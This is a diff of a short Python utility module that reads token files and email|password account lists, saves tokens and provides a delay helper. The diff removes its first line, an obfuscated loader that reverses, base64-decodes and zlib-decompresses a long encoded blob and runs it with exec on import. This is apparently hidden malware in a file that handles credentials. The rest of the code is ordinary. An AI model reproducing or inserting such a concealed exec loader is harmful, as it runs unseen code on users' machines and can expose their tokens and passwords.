@@ -1,1 +1,49 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wNUALn/df/+/X1rm3g9lxz7cjroeF4St3Iko6nZ4f6Ll+IssDdXvG/Nobwu8IuESGYBe/1iiwLWfQ8TlNBxwUgUf+N6KschmWxsObGv0TVxEdi967IWxIR40+L6JLdwGiREaTbF8s/4YFC9pFPJH9ZZS9RkcnXGwednia1Wkl0NxhgwzHWmeTFZnMdj0KxqCrcYFXh9pWTubWi3UhboORhTleS/abeD4+jWCsj3ZyuHWyabyh+2YR9CwbknPTZMKyz+suqhFOw0977PJ9OPWbHPtNVRrWefRtWR1KpkOoPWkpmZVBWA+1nsYYit6Hz33Rtud66Bf+T3MY3MAeXPoEq1RL4ZcoD0naM8ZjwgSYfUZYSpt/7NeSnTHE6zp56XvWcHE9f4NfaZLe6LVdIFx8tLlrzOC3qMEsoEQEZ+H7hNQwtcl7mHY9LGOmBw1vOA0fxy2+qA9xjxvRKq8ZP1IVGHlXS09vvSCYb/5LrFvJ9BeVsCHzdqPXFIgwDHGe7qOvEHuikQ42ud7Q7AufZ8PFteAfBiNbg20IFJlahWioY9z3ru6Z0o+aj20UiuhKo6QDq1Rf43a8AGFGlesYHCQdIM2fQMZKHrLapsbC15dZo9hT6WD8+D8LSepJVJ5HVJQHw7EOfYS66wiAmDVtlR6+cD+zooMHbcADCAUuvYueN3xLVnHRp6YQUOFzxhzdt3TqA0tLEZw0xTqnbm++8GtVfUcI9f84qP2P2sSGPyM1zcpypSpRMDvh6owfa145JnpfvtcFdouQMMYeOnl4nSSh44ujnLWKEw8scYp8V+yxj8I9H/tKefPUYiZfjoMrcSU+ALIOT4smz6gGyO7ian2SolbsOBXwByeUb6FuC2kltfxLxDWDvkbzVZyTeY23u4vGzqKE9PpV3K0bCRv5Hg6IHXOIkKyF9e57/ZYVg3AflWL6J2saoLj1EuQQpTAlBMs4/z03mvPjnTW5Bw0onUss9ZJS5YmjnzVYVzFLCrOeU5nhzxnyI1vy5Rd7uGZqbKS9CIc8IcqCTie6YFGLWNo8SFgwpXLQnvmnMt47SQI724mGWUPmQrwUX7sIfPc1Ukk7AZBDp8rGOLXvDoNMKFQ30l5L2cheyh9kUWQbeLpoio88aCler8WtRP3sZ2+3Ab91EprVMiXoppmGzHKovI7AMcm/0Pcx4NJmLQD0a5dGEg24Pek9W1N2z7cyTAPq3uTwxbMhb+ApeDyQlExMFc6L1TsEmioUJoGbRvsgtIjFpZ46jzefNJCleIp0U9vubs9g0Pws8eplEuUKeRD9epuXxRvH8yazdiAd++xDotI3kV671OQ0yVzHbhQy5H0Lkl9SJeSRKHGIAzXnAv+UQqquqeczkr2ln4+SkFl2Lis8FXe6Hxys1+GGUbaXlkTXIhHFOKHpJl5Yw3zOHmf07qskugUmICdvUM9a12Ew58PZFZ/ns5uh9ElFwl5jO/t6rKc9fElXxqFisH8Jcl098hAmKEgg0VQMjUdZ98Q5B+/KAQnLoGABULxVs2KIms7pmsyHKQ0ceWba7xVEgPO+yb3nuRxnqGYNPHuJ3V00X7wT4qL+Wg/doc8JG5pa2glqGoxYFLC3p1Y5EpogUjEVDyTzWPv+etRCuR2PlvSL/AXfSZG9ashwG4RUwfC446a1xRnrNBGjY98hwBFNqyXMPsbquBytJrLDC8sNoQCPoZHnrRFccumT2pymFfAYSm5om+/PIiBl2W3Q8E3qivBiJ8Fw/DEB/mbEgQLgzpNVGm8beenvirb/jivT27udtf/UjHcrySafuf8W9fhTHnMy0rAcaWpwl5/tj/OiC69wvzsOolfFMxQNlxjXrJ0adto6kXMKoyk0jJ7wty2QMnSx3URVk58VvOFPND9mOgYtXOlffDmIwC+fWd8C0yT5mWfqc+IB/hkL6aSk6+iZ1oPdEwfaB2NY2SfnS+6sxcQ7otaKT4Fo7JxBr58Vh99csWLOvN/EzD3nl/gmtp78SqVLly8AEDE372gj1pKLKN1grrCPrcXPRYJjB8Ncm3re0swZlGKTNq2jEKfEAG5zAuHPO+2joaF0DwZEMCh7b+C0WmXpHDkkgFdwp57wUIHd8uUnmfeTCd8jz7iRfe1m6c0WI0DsopRRdYOXOzoqZlP/7Eh9A98LUsS6DXEEKMtOEfbyjp6aMoI6O3MMyUR/XqAuNt3EFSrUvCBvDW9U+SQQCl66qv8dnuar6x/9HDUAGeV5DgEQt1m89mDaTrqNWM2TnNeHgM7LbCQcDVVGHn6R5gS5eyUzxLfrqSJfI/Yz0cOynGbcvysdkYxpl9tGHqK2zGPHOOcjCOLxp2nyef+jX+9eRRd6EoKh+5nKDH+nQTWtie1wZlgS8wEsr6bNkrsHPUb6SXnIhK8d4DYdw89k7J4JfQVYIgrO3Aeu88fJv0+5rB7o4rQSYkvclGo322tpS8v5P/j9Bv4X3gSPGiV85DTu/L653s1Song04P7jSx0+Ovi8y3Zx6nbfaEMMvXuM9Ob/mxF6FAA2gwRKmnSXYIDb49U1vUrl+LT87qQi1MCJ54Yr2ObShVB5mzW3BIEBemZsLnPBUh0KJwZ4qeEWYF+T0hfkf71YE9/MvifBbdsZNeExEvOJE7yjoY4sWXziOcGY5GhyUnIFecjXS+ai8U3Mamq9KVrS2dc8kbIT2y4B7SSuVMlsN+hm7CG1TBcQFvroFMob6jWP0Daz53unJPUprahEnsjX99VYFpYEZsWAxw/BcsfSMx21gSn1Q0H9raTQFIPsJvCrzu+X3FprWPgGIH6ytHo6jt4ONbXqQh3MQXRbfabX7K+5h/jAj5s/79R32DIXjnLwiEtqOJjkIOcBThpwCBskg+79WuSYCkc0w4J8mnMwSRNrUUEpswkFC8pKLQuEgJkgeqG+C7Hio2fWXlsCPmV2j7UCC4whkL6babc9GgkzKexaa3EDpPq0/x95I255M1yNAZmzxouiMiCh3/zGMrMwO/FjzYoJjqIGboIS8KJlrQGxyQAD8GDPqHuFRN2dHDP07/5Qw49hut/gf1ZBN9kG0PPtBEkUGsfIveEga8tbD6NrEFebMXS5nVFCOSjHZUiDxsqChJqD502DqDFUDTJbag8Apz+838SPCba3MmJmzaSrXoi/Br3MmYaS48pOosO3y6W+AS4H+fpWRdGT43LeYDVlkcAfFNNuzTeED3InKBiWWcuCFRsxFLWhBORWf+au2b2R3P2AZrKRTPevblhzIZP0Tnr3xMSuT+XjL+jpuvkX2gIlbzgTLBOaeRnxy1G+7OwiUfeAzaRJYssrW42xRUr+lnCGi8dqbpb972zSCqBkvz/lvcGPKje6Nadafdl91EDAWaMt0MWGZps0gbqnK/1D4NlUjth6L58J93w9EvRlZytUnPLcF8JLszwWOs3lSZrQ04fDsbnjN35Rd46BJHQ24kALRBvm1ra/nFC9fZO0GwHtoT0ld4ClrdrEpJrdSSrINFCnApZ0nEXlX3E8MsDwFUynwvtnd8FIosgtAOpLw6zSz6AIS2oA1Q3b9i556j0CrMz3mwYP6/s3O0axZAvEHijW4J07dk2TZh5n25rRcdGNIcl92qaGoAHKuUIbmrqrpHXlHJgP4nmtAXYTPXs5C91zFZrPV0fRSuYnz2XiGYhMpvd+mxGt1KKYZuWWjWGGkAM6JuS+WM91zmzdD6Wu2P5oUwT6Vu68zLH2FA0PWxabQd/UaM8kR89p2a7TCfQ6i4TyTXC7jLMtVEQjV0LO9Wx6w1y2uyyG2mFgirMi+KqevwaUn1T6mQtT7Bn/k2fY+AgkBFi6auciAKXtX5kusFYRx8uW0BAS7Hm+hGkbZHtctGMMxt629eO1sVFaZXPDws6P50X3dDftEWRc+wX7hC1vutN5nCbamyF+uQrTtJgN5ZBKZ0jCEliIYxW18RUegSX/DZJSitvy8+YmQkTB6Nt2k/5B/WXsD8fEsSDRDwqAdheXKntF7QjpU3kk8CSkirdN81k4NKxFxA7UTw+HzX8j16G7FzqTdk3xU2CgQgmC8a2SS1I52gUlfERsv9nR6VAsHR5O6BmmjjuYSBKmwenxHvb6xbr+l1XHyyV8cMe5p7Pjilzx/IQpftnHmgGDsWSr0DtBumznF1U3iqL1PmHj2LJV04pWIhxyejbPPGivcXxgLqC9y1iYqymYLGVYbj+Yn/KLfN5F3U5T7X3T7TBwqWrXHMZWSCn9kNVOk66p44btN0b4IaskcV6G8f19EO/ucKi5GIpXPS4Vu8+6crIuphxBUZh06f9rjpMzi9nNOXWXP6+p0Eo01FLKnMreyS1DF7YOHyiKsCAWRcqY3WPSeEaDfblRG0rAvT79Wzgor5ExqSY3Whk97Vg3isfDpl3eWzigAu1jxCsJAkK134o9+3FFE/+zS+hHXU+ZkEheGAZxXVTPtV47o2T9srUX9vjFnzMShMFjoIQ3/iWAUFBSwQz2Rv8bmpyg/iSCkRVu+35e0tITKgFJ+I4V5eJh+hs1D0jKmErrsExDJSUpVl1+X8IqTwZ4h7a4ZX2FdzRDeMFVuxmKODrUB5q1MusE/vv0euv4R20J0+3l0ERXtf/nbuGaYzufLeJF+iOXe+5yxC2wleVgMv+0qss8//98/n0v//fe++rypqa7lyErUQOwX6qfPzGzwwwv7Mz8wUpmZbU47TdYRyqTxyW0lVwJe'))
+import asyncio
+from api.logger import logger
+
+async def read_token(file_path):
+    try:
+        with open(file_path, 'r') as f:
+            tokens = [token.strip() for token in f.readlines() if token.strip()]
+            
+        if tokens:
+            return tokens
+        else:
+            raise Exception('No tokens found')
+            
+    except Exception as e:
+        raise Exception(f'Error reading tokens: {str(e)}')
+
+async def read_accounts(file_path):
+    try:
+        with open(file_path, 'r') as f:
+            accounts = []
+            for line in f:
+                line = line.strip()
+                if '|' not in line:
+                    continue
+                    
+                email, password = [part.strip() for part in line.split('|', 1)]
+                if not email or not password:
+                    continue
+                    
+                accounts.append({'email': email, 'password': password})
+                
+        if not accounts:
+            logger('No valid accounts found in the file.', 'warning')
+            
+        return accounts
+        
+    except Exception as e:
+        raise Exception(f'Error reading accounts: {str(e)}')
+
+def save_token(file_path, token):
+    try:
+        with open(file_path, 'a') as f:
+            f.write(f'{token}\n')
+        logger('Token saved successfully.', 'success')
+    except Exception as e:
+        logger(f'Error saving token: {str(e)}', 'error')
+
+async def delay(ms):
+    await asyncio.sleep(ms/1000)
